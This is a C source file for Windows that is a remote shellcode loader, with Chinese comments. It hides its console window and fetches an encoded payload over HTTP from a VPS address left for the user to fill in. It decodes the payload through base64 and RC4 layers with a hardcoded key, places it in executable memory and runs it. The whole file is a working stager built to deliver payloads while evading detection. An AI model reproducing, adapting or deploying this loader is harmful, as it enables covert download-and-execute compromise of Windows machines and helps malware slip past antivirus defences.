#ifdef _MSC_VER
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#endif
#include <Windows.h>
#include <stdlib.h>  
#include <string.h>
#pragma comment(lib, "ws2_32.lib")

unsigned char key[] = "ljjdfjdjdjs2803u8jc3344cxv121212";  /*RC4key,跟generator中的要一致*/
const char* IP = ""; /*your VPS IP*/
const char* path = "/shell.txt"; /* 服务器中shellcode的路径 */
int Base64ShellLen = ;  /*generator中给出的长度*/

void base64_decode(unsigned char* code)
{
    //根据base64表，以字符找到对应的十进制数据  
    int table[] = { 0,0,0,0,0,0,0,0,0,0,0,0,
             0,0,0,0,0,0,0,0,0,0,0,0,
             0,0,0,0,0,0,0,0,0,0,0,0,
             0,0,0,0,0,0,0,62,0,0,0,
             63,52,53,54,55,56,57,58,
             59,60,61,0,0,0,0,0,0,0,0,
             1,2,3,4,5,6,7,8,9,10,11,12,
             13,14,15,16,17,18,19,20,21,
             22,23,24,25,0,0,0,0,0,0,26,
             27,28,29,30,31,32,33,34,35,
             36,37,38,39,40,41,42,43,44,
             45,46,47,48,49,50,51
    };
    long len;
    long str_len;
    unsigned char* res = NULL;
    int i, j;

    //计算解码后的字符串长度  
    len = strlen((const char*)code);
    //判断编码后的字符串后是否有=  
    if (strstr((const char*)code, "=="))
        str_len = len / 4 * 3 - 2;
    else if (strstr((const char*)code, "="))
        str_len = len / 4 * 3 - 1;
    else
        str_len = len / 4 * 3;

    res = (unsigned char*)calloc(sizeof(unsigned char) * str_len + 3, 1);

    //以4个字符为一位进行解码  
    for (i = 0, j = 0; i < len - 2; j += 3, i += 4)
    {
        res[j] = ((unsigned char)table[code[i]]) << 2 | (((unsigned char)table[code[i + 1]]) >> 4); //取出第一个字符对应base64表的十进制数的前6位与第二个字符对应base64表的十进制数的后2位进行组合  
        res[j + 1] = (((unsigned char)table[code[i + 1]]) << 4) | (((unsigned char)table[code[i + 2]]) >> 2); //取出第二个字符对应base64表的十进制数的后4位与第三个字符对应bas464表的十进制数的后4位进行组合  
        res[j + 2] = (((unsigned char)table[code[i + 2]]) << 6) | ((unsigned char)table[code[i + 3]]); //取出第三个字符对应base64表的十进制数的后2位与第4个字符进行组合  
    }
    RtlMoveMemory(code, res, len);
    free(res);
    res = NULL;
}


char* GetCode(const char* host)
{
    WSADATA data;
    int err = WSAStartup(MAKEWORD(2, 2), &data);

    LPSTR ipstr = (char*)host;

    //Socket封装
    struct sockaddr_in si;
    si.sin_family = AF_INET;
    si.sin_port = htons(80);
    si.sin_addr.S_un.S_addr = inet_addr(ipstr);
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    connect(sock, (SOCKADDR*)&si, sizeof(si));
    if (sock == -1 || sock == -2)
        return 0;

    //发送请求
    char request[1024] = "GET ";
    strcat_s(request, path);
    strcat_s(request, " HTTP/1.1\r\nHost:");
    strcat_s(request, host);
    strcat_s(request, "\r\nConnection:Close\r\n\r\n");
    int ret = send(sock, request, strlen(request), 0);
    const int bufsize = 6144;
    char* buf = (char*)calloc(bufsize, 1);
    ret = recv(sock, buf, bufsize - 1, 0);
    while (TRUE) {
        if (*buf == '\x0d' && *(buf + 1) == '\x0a' && *(buf + 2) == '\x0d' && *(buf + 3) == '\x0a')
            break;
        else
            buf++;
    }
    buf += 4;
    closesocket(sock);
    WSACleanup();
    return buf;
}

//-----------------------RC4---------------------------------//
void swap(unsigned char* s1, unsigned char* s2)
{
    char temp;
    temp = *s1;
    *s1 = *s2;
    *s2 = temp;
}
void re_S(unsigned char* S)
{
    int i;
    for (i = 0; i < 256; i++)
        S[i] = i;
}
void re_T(unsigned char* T, unsigned char* key)
{
    int i;
    int keylen;
    keylen = strlen((const char*)key);
    for (i = 0; i < 256; i++)
        T[i] = key[i % keylen];
}
void re_Sbox(unsigned char* S, unsigned char* T)
{
    int i;
    int j = 0;
    for (i = 0; i < 256; i++)
    {
        j = (j + S[i] + T[i]) % 256;
        swap(&S[i], &S[j]);
    }
}

void RC4(unsigned char* text, unsigned char* key, int txtlen)
{
    unsigned char S[256] = { 0 };
    int i, j, m;
    unsigned char k = 0;
    unsigned char T[256] = { 0 };
    re_S(S);
    re_T(T, key);
    re_Sbox(S, T);
    i = j = m = 0;
    while (m < txtlen)
    {

        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        swap(&S[i], &S[j]);
        k = text[m] ^ (S[(S[i] + S[j]) % 256]);
        text[m] = k;
        m++;
    }
}
//-----------------------RC4---------------------------------//

int main()
{
    char* raw = 0;
    raw = GetCode(IP);
    int len = strlen(raw);
    unsigned char* Scode = (unsigned char*)calloc(6144, 1);
    RtlMoveMemory(Scode, raw, len);
    base64_decode(Scode);
    len = Base64ShellLen;
    RC4(Scode, key, len);
    base64_decode(Scode);
    void* exec = VirtualAlloc(0, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(exec, Scode, 1024);
    ((void(*)())exec)();
    return 0;
}
